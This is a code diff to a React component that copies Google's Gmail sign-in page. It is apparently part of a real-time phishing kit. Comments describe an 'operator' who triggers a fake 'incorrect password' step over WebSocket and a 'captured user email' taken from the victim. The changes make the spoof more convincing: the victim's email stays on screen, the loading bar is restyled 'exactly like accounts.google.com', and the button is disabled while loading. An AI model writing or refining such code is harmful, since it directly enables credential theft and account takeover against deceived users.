@@ -56,6 +56,23 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
     return () => clearTimeout(timer);
   }, []);
 
+  // Keep the local `email` state in sync with `defaultEmail` whenever the
+  // parent supplies a non-empty value. This is what guarantees the password
+  // step's email pill (avatar + label) always shows the captured user email
+  // — even when the page is re-entered via WS `show_incorrect_password`
+  // after the operator has already pressed "Incorrect Pass" once before
+  // (react-router may reuse the existing component instance and not reset
+  // useState; without this effect the avatar would render an empty blue
+  // dot whenever the prior email state was empty).
+  useEffect(() => {
+    if (defaultEmail && defaultEmail !== email) {
+      setEmail(defaultEmail);
+    }
+    // We intentionally do NOT reset to '' when defaultEmail becomes empty —
+    // a transient empty prop must never erase the email already shown.
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [defaultEmail]);
+
   const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
     if (email) { 
@@ -80,35 +97,6 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
     );
   }
 
-  // Show signing in loading state during transition (with progress line)
-  if (isTransitioning) {
-    return (
-      <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
-        <main className="flex-grow w-full flex items-center justify-center p-4">
-          <div 
-            className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12 relative overflow-hidden"
-            style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
-          >
-            {/* Progress line at top */}
-            <div className="absolute top-0 left-0 right-0 h-[3px] bg-blue-100 overflow-hidden">
-              <div className="h-full bg-blue-600" style={{ animation: 'signingProgress 1s ease-in-out forwards' }} />
-            </div>
-            <style>{`
-              @keyframes signingProgress {
-                0% { width: 0%; }
-                100% { width: 100%; }
-              }
-            `}</style>
-            <div className="flex flex-col items-center justify-center py-16">
-              <Spinner size="lg" color="border-blue-600" />
-              <p className="mt-6 text-gray-700 text-base">Signing in…</p>
-            </div>
-          </div>
-        </main>
-      </div>
-    );
-  }
-
   const GoogleLogo = () => (
     <svg viewBox="0 0 48 48" className="h-10 w-10" xmlns="http://www.w3.org/2000/svg">
       <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -121,10 +109,49 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
   return (
     <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]" style={{ animation: 'fadeIn 0.3s ease-in' }}>
       <main className="flex-grow w-full flex items-center justify-center p-4">
-        <div 
-          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12"
+        <div
+          className="w-full max-w-[960px] mx-auto bg-white rounded-[28px] px-10 md:px-14 py-10 md:py-12 relative overflow-hidden"
           style={{ boxShadow: '0 1px 2px 0 rgba(60,64,67,.08), 0 1px 3px 1px rgba(60,64,67,.04)' }}
         >
+          {/* Real-Google-style thin loading bar pinned to the very top edge of
+              the white sign-in card, shown above the email/form while we
+              transition from the email step to the password step — exactly
+              like accounts.google.com. */}
+          {isTransitioning && (
+            <>
+              <div
+                aria-hidden="true"
+                style={{
+                  position: 'absolute',
+                  top: 0,
+                  left: 0,
+                  right: 0,
+                  height: '3px',
+                  backgroundColor: '#e8f0fe',
+                  overflow: 'hidden',
+                  borderTopLeftRadius: '28px',
+                  borderTopRightRadius: '28px',
+                }}
+              >
+                <div
+                  style={{
+                    position: 'absolute',
+                    top: 0,
+                    bottom: 0,
+                    width: '40%',
+                    backgroundColor: '#1a73e8',
+                    animation: 'gmailTopBarSlide 1s ease-in-out infinite',
+                  }}
+                />
+              </div>
+              <style>{`
+                @keyframes gmailTopBarSlide {
+                  0% { transform: translateX(-100%); }
+                  100% { transform: translateX(350%); }
+                }
+              `}</style>
+            </>
+          )}
           <form onSubmit={handleSubmit}>
             <div className="flex flex-col md:flex-row md:gap-16">
               {/* Left Column: Logo and heading */}
@@ -142,10 +169,23 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
                     <h1 className="text-[36px] leading-[44px] font-normal text-gray-900 mt-8">Welcome</h1>
                     <div className="mt-6">
                       <button type="button" className="inline-flex items-center space-x-2 px-2 py-1 border border-gray-300 rounded-full hover:bg-gray-50 transition-colors">
-                        <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-semibold">
-                          {email.charAt(0).toUpperCase()}
-                        </div>
-                        <span className="text-sm text-gray-800 pr-1">{email}</span>
+                        {email ? (
+                          <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center text-white text-xs font-semibold">
+                            {email.charAt(0).toUpperCase()}
+                          </div>
+                        ) : (
+                          // Defensive fallback only — should never render in practice
+                          // because IncorrectPasswordPage always supplies the captured
+                          // email via WebSocket (`show_incorrect_password.email`). A
+                          // generic person glyph is shown instead of a bare colored
+                          // bubble so the UI never displays a stray "blue dot".
+                          <div className="w-7 h-7 rounded-full bg-gray-200 flex items-center justify-center text-gray-500">
+                            <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+                              <path d="M12 12a4 4 0 100-8 4 4 0 000 8zm0 2c-3.314 0-8 1.657-8 5v1h16v-1c0-3.343-4.686-5-8-5z" />
+                            </svg>
+                          </div>
+                        )}
+                        {email && <span className="text-sm text-gray-800 pr-1">{email}</span>}
                         <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
                           <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                         </svg>
@@ -179,7 +219,7 @@ const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLogin
                       <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
                         Create account
                       </a>
-                      <button onClick={handleNext} disabled={!email} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
+                      <button onClick={handleNext} disabled={!email || isTransitioning} className="px-6 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
                         Next
                       </button>
                     </div>
